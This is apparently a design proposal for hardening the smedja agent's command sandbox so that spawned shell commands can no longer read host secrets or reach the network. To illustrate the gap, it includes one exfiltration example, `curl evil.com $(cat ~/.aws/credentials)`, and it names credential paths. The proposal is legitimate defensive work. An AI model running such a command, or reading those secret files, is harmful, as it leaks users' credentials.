## Why

The merged `exec-sandbox` change confines agent-run shell commands (`bash`, `run_command`) behind a `SandboxBackend` (Docker / macOS Seatbelt / Linux Landlock). That confinement is **filesystem-WRITE only**. Two gaps let a sandboxed subprocess defeat the agent's own isolation:

1. **Reads are unconfined.** The Landlock backend grants `read+exec` across all of `/` (`landlock_backend.rs:78-82`) so the shell and its shared libraries load; the Seatbelt profile grants `(allow file-read*)` unconditionally (`scripts/sandbox/seatbelt.sb.template:24`). A sandboxed command can therefore read host secrets — `~/.ssh/id_*`, `~/.aws/credentials`, `~/.config/...` — and emit them as tool output. The crate doc even states this is intentional ("Read confinement … intentionally out of scope", `landlock_backend.rs:15-18`).
2. **Network egress is unconfined for the subprocess.** `is_blocked_ip` (`main.rs:361`) and `NetworkPolicy::permits_dest` (`sandbox.rs:119`) guard smedja's *own* HTTP clients, not a child process's sockets. The `NetworkPolicy { None, Allowlist, Open }` enum exists but Landlock never enforces it — `exec()` takes `_policy` and ignores it (`landlock_backend.rs:113`). A sandboxed `curl evil.com $(cat ~/.aws/credentials)` exfiltrates freely under the Linux backend even with `SMEDJA_SANDBOX_NETWORK=none`.

This is a legitimate defensive-security hardening: smedja is confining the subprocesses *its own agent* spawns. This change closes both gaps by extending the existing backends, not replacing them.

## What Changes

- **Read confinement (tighten the allow-list).** Switch the Landlock backend from "read+exec on `/`" to a tighter allow-list: read+exec on a configurable set of system directories programs actually need (`/usr`, `/bin`, `/sbin`, `/lib`, `/lib64`, `/etc`, `/opt`, …) plus the confined root, but NOT the user's home/secret directories — so `~/.ssh` and `~/.aws` are unreadable. Seatbelt: replace blanket `(allow file-read*)` with read allow on the same system-dir set plus explicit `(deny file-read*)` on secret subpaths. Docker: already isolated (no host-home mount); document that the read floor is structural there. The system-dir set is configurable via `SMEDJA_SANDBOX_READ_PATHS` and the failure mode (a program reading an unlisted path) is documented.
- **Network confinement (enforce `NetworkPolicy` per backend).** Linux: run the sandboxed command in a network namespace (`unshare -n` / equivalent) when `policy == None`, so `none` means no egress at all; `allowlist`/`open` keep the `is_blocked_ip` floor as the egress ceiling (with an honest limitation: a raw subprocess cannot be IP-filtered the way an in-process HTTP client is, so `allowlist` degrades to `open`-minus-blocked-ranges unless a filtering proxy is configured). macOS Seatbelt: `(deny network*)` for `none` (already in the template's network rule). Docker: `--network none|bridge` (already mapped).
- **Default posture.** Hardened read/network confinement is on **whenever the sandbox is enabled** (any non-`off` `SMEDJA_SANDBOX_MODE`), preserving the existing `auto|required|off` mode semantics and the fallback contract. Operators widen the read allow-list via `SMEDJA_SANDBOX_READ_PATHS` rather than disabling hardening.
- **Telemetry.** The `smedja.sandbox.exec` span gains `read_confined` and `net_confined` boolean attributes so operators can see which protections were applied.

## Capabilities

### New Capabilities

- `read-confinement`: a sandboxed command's filesystem **reads** are confined to a configurable allow-list of system directories plus the confined root; the user's home and secret directories (`~/.ssh`, `~/.aws`, `~/.config`) are unreadable. Enforced per backend (Landlock tightened allow-list, Seatbelt read-deny, Docker structural isolation).
- `network-confinement`: the declarative `NetworkPolicy` is actually enforced for the sandboxed subprocess. `none` denies all egress (Linux network namespace, Seatbelt `(deny network*)`, Docker `--network none`); `allowlist`/`open` keep the `is_blocked_ip` ranges blocked as the egress floor.

## Impact

- `bin/smdjad/src/sandbox/landlock_backend.rs`: replace the `read+exec on /` grant with a tightened, configurable allow-list; wrap the child in a network namespace when `policy == None`; honour `_policy` instead of ignoring it; update the module doc.
- `bin/smdjad/src/sandbox/seatbelt.rs`: render a system-dir read allow-list plus secret-path read-denies; keep the existing `network_rule` mapping.
- `scripts/sandbox/seatbelt.sb.template`: replace blanket `(allow file-read*)` with `@READ_PATHS@` (allow) and `@READ_DENY@` (deny secret subpaths) placeholders.
- `bin/smdjad/src/sandbox/docker.rs`: document the structural read floor (no host-home mount); no behavioural change to `network_arg`.
- `bin/smdjad/src/sandbox.rs`: add `read_paths` resolution (`SMEDJA_SANDBOX_READ_PATHS`), thread `read_confined`/`net_confined` into `SandboxTelemetry` and the `smedja.sandbox.exec` span.
- README / sandbox docs: document the read allow-list, the `SMEDJA_SANDBOX_READ_PATHS` override and its failure mode, and the per-backend network-confinement matrix.
